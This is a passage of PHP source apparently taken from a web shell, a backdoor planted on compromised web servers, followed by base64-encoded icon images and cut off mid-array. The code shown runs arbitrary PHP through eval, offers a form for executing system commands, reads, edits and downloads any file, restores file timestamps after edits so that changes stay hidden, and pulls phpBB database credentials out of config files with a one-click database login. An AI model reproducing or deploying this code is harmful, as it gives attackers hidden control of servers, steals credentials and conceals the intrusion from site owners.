        echo "<br><textarea cols=\"115\" rows=\"15\" readonly>";
        eval($eval);
        echo "</textarea>";
      }
      else {echo $ret;}
    }
    @chdir($olddir);
  }
  else {echo "<b>PHP-code Execution (Use without PHP Braces!)</b>"; if (empty($eval_txt)) {$eval_txt = TRUE;}}
  echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=eval><textarea name=\"eval\" cols=\"115\" rows=\"10\">".htmlspecialchars($eval)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "></form>";
}
if ($act == "f") {
  echo "<div align=left>";
  if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit") {
    if (file_exists($d.$f)) {echo "<center><b>Permision denied (".htmlspecialchars($d.$f).")!</b></center>";}
    else {echo "<center><b>File does not exists (".htmlspecialchars($d.$f).")!</b><br><a href=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\"><u>Create</u></a></center>";}
  }
  else {
    $r = @file_get_contents($d.$f);
    $ext = explode(".",$f);
    $c = count($ext)-1;
    $ext = $ext[$c];
    $ext = strtolower($ext);
    $rft = "";
    foreach($ftypes as $k=>$v) {if (in_array($ext,$v)) {$rft = $k; break;}}
    if (eregi("sess_(.*)",$f)) {$rft = "phpsess";}
    if (empty($ft)) {$ft = $rft;}
    $arr = array(
        array("<img src=\"".$surl."act=img&img=ext_diz\" border=\"0\">","info"),
        array("<img src=\"".$surl."act=img&img=ext_html\" border=\"0\">","html"),
        array("<img src=\"".$surl."act=img&img=ext_txt\" border=\"0\">","txt"),
        array("Code","code"),
        array("Session","phpsess"),
        array("<img src=\"".$surl."act=img&img=ext_exe\" border=\"0\">","exe"),
        array("SDB","sdb"),
        array("<img src=\"".$surl."act=img&img=ext_gif\" border=\"0\">","img"),
        array("<img src=\"".$surl."act=img&img=ext_ini\" border=\"0\">","ini"),
        array("<img src=\"".$surl."act=img&img=download\" border=\"0\">","download"),
        array("<img src=\"".$surl."act=img&img=ext_rtf\" border=\"0\">","notepad"),
        array("<img src=\"".$surl."act=img&img=change\" border=\"0\">","edit")
    );
    echo "<b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\">&nbsp;".$f." (".view_size(filesize($d.$f)).") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".view_perms_color($d.$f)."</b><br>Select action/file-type:<br>";
    foreach($arr as $t) {
      if ($t[1] == $rft) {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><font color=green>".$t[0]."</font></a>";}
      elseif ($t[1] == $ft) {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b><u>".$t[0]."</u></b></a>";}
      else {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b>".$t[0]."</b></a>";}
      echo " (<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&white=1&d=".urlencode($d)."\" target=\"_blank\">+</a>) |";
    }
    echo "<hr size=\"1\" noshade>";
    if ($ft == "info") {
      echo "<b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> ".$d.$f."</td></tr><tr><td><b>Size</b></td><td> ".view_size(filesize($d.$f))."</td></tr><tr><td><b>MD5</b></td><td> ".md5_file($d.$f)."</td></tr>";
      if (!$win) {
        echo "<tr><td><b>Owner/Group</b></td><td> ";
        $ow = posix_getpwuid(fileowner($d.$f));
        $gr = posix_getgrgid(filegroup($d.$f));
        echo ($ow["name"]?$ow["name"]:fileowner($d.$f))."/".($gr["name"]?$gr["name"]:filegroup($d.$f));
      }
      echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&f=".urlencode($f)."&d=".urlencode($d)."\">".view_perms_color($d.$f)."</a></td></tr><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d.$f))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d.$f))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d.$f))."</td></tr></table>";
      $fi = fopen($d.$f,"rb");
      if ($fi) {
        if ($fullhexdump) {echo "<b>FULL HEXDUMP</b>"; $str = fread($fi,filesize($d.$f));}
        else {echo "<b>HEXDUMP PREVIEW</b>"; $str = fread($fi,$hexdump_lines*$hexdump_rows);}
        $n = 0;
        $a0 = "00000000<br>";
        $a1 = "";
        $a2 = "";
        for ($i=0; $i<strlen($str); $i++) {
          $a1 .= sprintf("%02X",ord($str[$i]))." ";
          switch (ord($str[$i])) {
            case 0:  $a2 .= "<font>0</font>"; break;
            case 32:
            case 10:
            case 13: $a2 .= "&nbsp;"; break;
            default: $a2 .= htmlspecialchars($str[$i]);
          }
          $n++;
          if ($n == $hexdump_rows) {
            $n = 0;
            if ($i+1 < strlen($str)) {$a0 .= sprintf("%08X",$i+1)."<br>";}
            $a1 .= "<br>";
            $a2 .= "<br>";
          }
        }
        echo "<table border=1 bgcolor=#666666>".
             "<tr><td bgcolor=#666666>".$a0."</td>".
             "<td bgcolor=#000000>".$a1."</td>".
             "<td bgcolor=#000000>".$a2."</td>".
             "</tr></table><br>";
      }
      $encoded = "";
      if ($base64 == 1) {
        echo "<b>Base64 Encode</b><br>";
        $encoded = base64_encode(file_get_contents($d.$f));
      }
      elseif($base64 == 2) {
        echo "<b>Base64 Encode + Chunk</b><br>";
        $encoded = chunk_split(base64_encode(file_get_contents($d.$f)));
      }
      elseif($base64 == 3) {
        echo "<b>Base64 Encode + Chunk + Quotes</b><br>";
        $encoded = base64_encode(file_get_contents($d.$f));
        $encoded = substr(preg_replace("!.{1,76}!","'\\0'.\n",$encoded),0,-2);
      }
      elseif($base64 == 4) {
        $text = file_get_contents($d.$f);
        $encoded = base64_decode($text);
        echo "<b>Base64 Decode";
    if (base64_encode($encoded) != $text) {echo " (failed)";}
    echo "</b><br>";
   }
   if (!empty($encoded))
   {
    echo "<textarea cols=80 rows=10>".htmlspecialchars($encoded)."</textarea><br><br>";
   }
   echo "<b>HEXDUMP:</b><nobr> [<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&fullhexdump=1&d=".urlencode($d)."\">Full</a>] [<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&d=".urlencode($d)."\">Preview</a>]<br><b>Base64: </b>
        <nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=1&d=".urlencode($d)."\">Encode</a>]&nbsp;</nobr>
        <nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=2&d=".urlencode($d)."\">+chunk</a>]&nbsp;</nobr>
        <nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=3&d=".urlencode($d)."\">+chunk+quotes</a>]&nbsp;</nobr>
        <nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=4&d=".urlencode($d)."\">Decode</a>]&nbsp;</nobr>
        <P>";
  }
  elseif ($ft == "html") {
   if ($white) {@ob_clean();}
   echo $r;
   if ($white) {tpshexit();}
  }
  elseif ($ft == "txt") {echo "<pre>".htmlspecialchars($r)."</pre>";}
  elseif ($ft == "ini") {echo "<pre>"; var_dump(parse_ini_file($d.$f,TRUE)); echo "</pre>";}
  elseif ($ft == "phpsess") {
   echo "<pre>";
   $v = explode("|",$r);
   echo $v[0]."<br>";
   var_dump(unserialize($v[1]));
   echo "</pre>";
  }
  elseif ($ft == "exe") {
   $ext = explode(".",$f);
   $c = count($ext)-1;
   $ext = $ext[$c];
   $ext = strtolower($ext);
   $rft = "";
   foreach($exeftypes as $k=>$v)
   {
    if (in_array($ext,$v)) {$rft = $k; break;}
   }
   $cmd = str_replace("%f%",$f,$rft);
   echo "<b>Execute file:</b><form action=\"".$surl."\" method=POST><input type=hidden name=act value=cmd><input type=\"text\" name=\"cmd\" value=\"".htmlspecialchars($cmd)."\" size=\"".(strlen($cmd)+2)."\"><br>Display in text-area<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\" checked><input type=hidden name=\"d\" value=\"".htmlspecialchars($d)."\"><br><input type=submit name=submit value=\"Execute\"></form>";
  }
  elseif ($ft == "sdb") {echo "<pre>"; var_dump(unserialize(base64_decode($r))); echo "</pre>";}
  elseif ($ft == "code") {
    if (ereg("php"."BB 2.(.*) auto-generated config file",$r)) {
      $arr = explode("\n",$r);
      if (count($arr == 18)) {
        include($d.$f);
        echo "<b>phpBB configuration is detected in this file!<br>";
        if ($dbms == "mysql4") {$dbms = "mysql";}
        if ($dbms == "mysql") {echo "<a href=\"".$surl."act=sql&sql_server=".htmlspecialchars($dbhost)."&sql_login=".htmlspecialchars($dbuser)."&sql_passwd=".htmlspecialchars($dbpasswd)."&sql_port=3306&sql_db=".htmlspecialchars($dbname)."\"><b><u>Connect to DB</u></b></a><br><br>";}
        else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by ".$sh_name.". Please, report us for fix.";}
        echo "Parameters for manual connect:<br>";
        $cfgvars = array("dbms"=>$dbms,"dbhost"=>$dbhost,"dbname"=>$dbname,"dbuser"=>$dbuser,"dbpasswd"=>$dbpasswd);
        foreach ($cfgvars as $k=>$v) {echo htmlspecialchars($k)."='".htmlspecialchars($v)."'<br>";}
        echo "</b><hr size=\"1\" noshade>";
      }
    }
    echo "<div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ".$highlight_background .";\">";
    if (!empty($white)) {@ob_clean();}
    highlight_file($d.$f);
    if (!empty($white)) {tpshexit();}
    echo "</div>";
  }
  elseif ($ft == "download") {
    @ob_clean();
    header("Content-type: application/octet-stream");
    header("Content-length: ".filesize($d.$f));
    header("Content-disposition: attachment; filename=\"".$f."\";");
    echo $r;
    exit;
  }
  elseif ($ft == "notepad") {
    @ob_clean();
    header("Content-type: text/plain");
    header("Content-disposition: attachment; filename=\"".$f.".txt\";");
    echo($r);
    exit;
  }
  elseif ($ft == "img") {
    $inf = getimagesize($d.$f);
    if (!$white) {
      if (empty($imgsize)) {$imgsize = 20;}
      $width = $inf[0]/100*$imgsize;
      $height = $inf[1]/100*$imgsize;
      echo "<center><b>Size:</b>&nbsp;";
      $sizes = array("100","50","20");
      foreach ($sizes as $v) {
        echo "<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=img&d=".urlencode($d)."&imgsize=".$v."\">";
        if ($imgsize != $v ) {echo $v;}
        else {echo "<u>".$v."</u>";}
        echo "</a>&nbsp;&nbsp;&nbsp;";
      }
      echo "<br><br><img src=\"".$surl."act=f&f=".urlencode($f)."&ft=img&white=1&d=".urlencode($d)."\" width=\"".$width."\" height=\"".$height."\" border=\"1\"></center>";
    }
    else {
      @ob_clean();
      $ext = explode($f,".");
      $ext = $ext[count($ext)-1];
      header("Content-type: ".$inf["mime"]);
      readfile($d.$f);
      exit;
    }
  }
  elseif ($ft == "edit") {
   if (!empty($submit))
   {
    if ($filestealth) {$stat = stat($d.$f);}
    $fp = fopen($d.$f,"w");
    if (!$fp) {echo "<b>Can't write to file!</b>";}
    else
    {
     echo "<b>Saved!</b>";
     fwrite($fp,$edit_text);
     fclose($fp);
     if ($filestealth) {touch($d.$f,$stat[9],$stat[8]);}
     $r = $edit_text;
    }
   }
   $rows = count(explode("\r\n",$r));
   if ($rows < 10) {$rows = 10;}
   if ($rows > 30) {$rows = 30;}
   echo "<form action=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."\" method=POST><input type=submit name=submit value=\"Save\">&nbsp;<input type=\"reset\" value=\"Reset\">&nbsp;<input type=\"button\" onclick=\"location.href='".addslashes($surl."act=ls&d=".substr($d,0,-1))."';\" value=\"Back\"><br><textarea name=\"edit_text\" cols=\"122\" rows=\"".$rows."\">".htmlspecialchars($r)."</textarea></form>";
  }
  elseif (!empty($ft)) {echo "<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of \$GLOBALS.</b></center>";}
  else {echo "<center><b>Unknown file type (".$ext."), please select type manually.</b></center>";}
}
echo "</div>\n";
}
}
else {
@ob_clean();
$images = array(
"arrow_ltr"=>
"R0lGODlhJgAWAIABAP///wAAACH5BAHoAwEALAAAAAAmABYAAAIvjI+py+0PF4i0gVvzuVxXDnoQ".
"SIrUZGZoerKf28KjPNPOaku5RfZ+uQsKh8RiogAAOw==",
"back"=>
"R0lGODlhFAAUAKIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8".
"aLrc/jDKSWWpjVysSNiYJ4CUOBJoqjniILzwuzLtYN/3zBSErf6kBW+gKRiPRghPh+EFK0mOUEqt".
"Wg0JADs=",
"buffer"=>
"R0lGODlhFAAUAKIAAAAAAP////j4+N3d3czMzLKysoaGhv///yH5BAEAAAcALAAAAAAUABQAAANo".
"eLrcribG90y4F1Amu5+NhY2kxl2CMKwrQRSGuVjp4LmwDAWqiAGFXChg+xhnRB+ptLOhai1crEmD".
"Dlwv4cEC46mi2YgJQKaxsEGDFnnGwWDTEzj9jrPRdbhuG8Cr/2INZIOEhXsbDwkAOw==",
"change"=>
"R0lGODlhFAAUAMQfAL3hj7nX+pqo1ejy/f7YAcTb+8vh+6FtH56WZtvr/RAQEZecx9Ll/PX6/v3+".
"/3eHt6q88eHu/ZkfH3yVyIuQt+72/kOm99fo/P8AZm57rkGS4Hez6pil9oep3GZmZv///yH5BAEA".
"AB8ALAAAAAAUABQAAAWf4CeOZGme6NmtLOulX+c4TVNVQ7e9qFzfg4HFonkdJA5S54cbRAoFyEOC".
"wSiUtmYkkrgwOAeA5zrqaLldBiNMIJeD266XYTgQDm5Rx8mdG+oAbSYdaH4Ga3c8JBMJaXQGBQgA".
"CHkjE4aQkQ0AlSITan+ZAQqkiiQPj1AFAaMKEKYjD39QrKwKAa8nGQK8Agu/CxTCsCMexsfIxjDL".
"zMshADs=",
"delete"=>
"R0lGODlhFAAUAOZZAPz8/NPFyNgHLs0YOvPz8/b29sacpNXV1fX19cwXOfDw8Kenp/n5+etgeunp".
"6dcGLMMpRurq6pKSktvb2+/v7+1wh3R0dPnP17iAipxyel9fX7djcscSM93d3ZGRkeEsTevd4LCw".
"sGRkZGpOU+IfQ+EQNoh6fdIcPeHh4YWFhbJQYvLy8ui+xm5ubsxccOx8kcM4UtY9WeAdQYmJifWv".
"vHx8fMnJycM3Uf3v8rRue98ONbOzs9YFK5SUlKYoP+Tk5N0oSufn57ZGWsQrR9kIL5CQkOPj42Vl".
"ZeAPNudAX9sKMPv7+15QU5ubm39/f8e5u4xiatra2ubKz8PDw+pfee9/lMK0t81rfd8AKf///wAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5".
"BAEAAFkALAAAAAAUABQAAAesgFmCg4SFhoeIhiUfIImIMlgQB46GLAlYQkaFVVhSAIZLT5cbEYI4".
"STo5MxOfhQwBA1gYChckQBk1OwiIALACLkgxJilTBI69RFhDFh4HDJRZVFgPPFBR0FkNWDdMHA8G".
"BZTaMCISVgMC4IkVWCcaPSi96OqGNFhKI04dgr0QWFcKDL3A4uOIjVZZABxQIWDBLkIEQrRoQsHQ".
"jwVFHBgiEGQFIgQasYkcSbJQIAA7",
"download"=>
"R0lGODlhFAAUALMIAAD/AACAAIAAAMDAwH9/f/8AAP///wAAAP///wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAAUABQAAAROEMlJq704UyGOvkLhfVU4kpOJSpx5nF9YiCtLf0SuH7pu".
"EYOgcBgkwAiGpHKZzB2JxADASQFCidQJsMfdGqsDJnOQlXTP38przWbX3qgIADs=",
"forward"=>
"R0lGODlhFAAUAPIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8".
"aLrc/jDK2Qp9xV5WiN5G50FZaRLD6IhE66Lpt3RDbd9CQFSE4P++QW7He7UKPh0IqVw2l0RQSEqt".
"WqsJADs=",
"home"=>
"R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzLKysoaGhmZmZgQEBP///wAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAkALAAAAAAUABQAAAR+MMk5TTWI6ipyMoO3cUWRgeJoCCaLoKO0mq0ZxjNSBDWS".
"krqAsLfJ7YQBl4tiRCYFSpPMdRRCoQOiL4i8CgZgk09WfWLBYZHB6UWjCequwEDHuOEVK3QtgN/j".
"VwMrBDZvgF+ChHaGeYiCBQYHCH8VBJaWdAeSl5YiW5+goBIRADs=",
"mode"=>
"R0lGODlhHQAUALMAAAAAAP///6CgpN3d3czMzIaGhmZmZl9fX////wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAAdABQAAASBEMlJq70461m6/+AHZMUgnGiqniNWHHAsz3F7FUGu73xO".
"2BZcwGDoEXk/Uq4ICACeQ6fzmXTlns0ddle99b7cFvYpER55Z10Xy1lKt8wpoIsACrdaqBpYEYK/".
"dH1LRWiEe0pRTXBvVHwUd3o6eD6OHASXmJmamJUSY5+gnxujpBIRADs=",
"search"=>
"R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzMDAwLKysoaGhnd3d2ZmZl9fX01NTSkpKQQEBP//".
"/wAAACH5BAEAAA4ALAAAAAAUABQAAASn0Ml5qj0z5xr6+JZGeUZpHIqRNOIRfIYiy+a6vcOpHOap".
"s5IKQccz8XgK4EGgQqWMvkrSscylhoaFVmuZLgUDAnZxEBMODSnrkhiSCZ4CGrUWMA+LLDxuSHsD".
"AkN4C3sfBX10VHaBJ4QfA4eIU4pijQcFmCVoNkFlggcMRScNSUCdJyhoDasNZ5MTDVsXBwlviRmr".
"Cbq7C6sIrqawrKwTv68iyA6rDhEAOw==",
"setup"=>
"R0lGODlhFAAUAMQAAAAAAP////j4+OPj493d3czMzMDAwLKyspaWloaGhnd3d2ZmZl9fX01NTUJC".
"QhwcHP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA".
"ABAALAAAAAAUABQAAAWVICSKikKWaDmuShCUbjzMwEoGhVvsfHEENRYOgegljkeg0PF4KBIFRMIB".
"qCaCJ4eIGQVoIVWsTfQoXMfoUfmMZrgZ2GNDPGII7gJDLYErwG1vgW8CCQtzgHiJAnaFhyt2dwQE".
"OwcMZoZ0kJKUlZeOdQKbPgedjZmhnAcJlqaIqUesmIikpEixnyJhulUMhg24aSO6YyEAOw==",
"small_dir"=>
"R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp".
"/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=",
"small_unk"=>
"R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAIep3BE9mllic3B5iVpjdMvh/MLc+y1U".
"p9Pm/GVufc7j/MzV/9Xm/EOm99bn/Njp/a7Q+tTm/LHS+eXw/t3r/Nnp/djo/Nrq/fj7/9vq/Nfo".
"/Mbe+8rh/Mng+7jW+rvY+r7Z+7XR9dDk/NHk/NLl/LTU+rnX+8zi/LbV++fx/e72/vH3/vL4/u31".
"/e31/uDu/dzr/Orz/eHu/fX6/vH4/v////v+/3ez6vf7//T5/kGS4Pv9/7XV+rHT+r/b+rza+vP4".
"/uz0/urz/u71/uvz/dTn/M/k/N3s/dvr/cjg+8Pd+8Hc+sff+8Te+/D2/rXI8rHF8brM87fJ8nmP".
"wr3N86/D8KvB8F9neEFotEBntENptENptSxUpx1IoDlfrTRcrZeeyZacxpmhzIuRtpWZxIuOuKqz".
"9ZOWwX6Is3WIu5im07rJ9J2t2Zek0m57rpqo1nKCtUVrtYir3vf6/46v4Yuu4WZvfr7P6sPS6sDQ".
"66XB6cjZ8a/K79/s/dbn/ezz/czd9mN0jKTB6ai/76W97niXz2GCwV6AwUdstXyVyGSDwnmYz4io".
"24Oi1a3B45Sy4ae944Ccz4Sj1n2GlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAjnACtVCkCw4JxJAQQqFBjAxo0MNGqsABQAh6CFA3nk0MHiRREVDhzsoLQwAJ0gT4ToecSHAYMz".
"aQgoDNCCSB4EAnImCiSBjUyGLobgXBTpkAA5I6pgmSkDz5cuMSz8yWlAyoCZFGb4SQKhASMBXJpM".
"uSrQEQwkGjYkQCTAy6AlUMhWklQBw4MEhgSA6XPgRxS5ii40KLFgi4BGTEKAsCKXihESCzrsgSQC".
"yIkUV+SqOYLCA4csAup86OGDkNw4BpQ4OaBFgB0TEyIUKqDwTRs4a9yMCSOmDBoyZu4sJKCgwIDj".
"yAsokBkQADs=",
"multipage"=>"R0lGODlhCgAMAJEDAP/////3mQAAAAAAACH5BAEAAAMALAAAAAAKAAwAAAIj3IR".
"pJhCODnovidAovBdMzzkixlXdlI2oZpJWEsSywLzRUAAAOw==",
"sort_asc"=>
"R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMa".
"SLrcPcE9GKUaQlQ5sN5PloFLJ35OoK6q5SYAOw==",
"sort_desc"=>
"R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMb".
"SLrcOjBCB4UVITgyLt5ch2mgSJZDBi7p6hIJADs=",
"sql_button_drop"=>
"R0lGODlhCQALAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".
"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".
"AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/".
"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm".
"ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/".
"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm".
"zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/".
"/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ".
"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA".
"M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ".
"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A".
"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".
"zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAAJAAsA".
"AAg4AP8JREFQ4D+CCBOi4MawITeFCg/iQhEPxcSBlFCoQ5Fx4MSKv1BgRGGMo0iJFC2ehHjSoMt/".
"AQEAOw==",
"sql_button_empty"=>
"R0lGODlhCQAKAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".
"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".
"AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/".
"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm".
"ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/".
"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm".
"zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/".
"/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ".
"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA".
"M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ".
"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A".
"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".
"zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAAJAAoA".
"AAgjAP8JREFQ4D+CCBOiMMhQocKDEBcujEiRosSBFjFenOhwYUAAOw==",
"sql_button_insert"=>
"R0lGODlhDQAMAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".
"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".
"AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/".
"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm".
"ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/".
"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm".
"zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/".
"/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ".
"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA".
"M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ".
"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A".
"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".
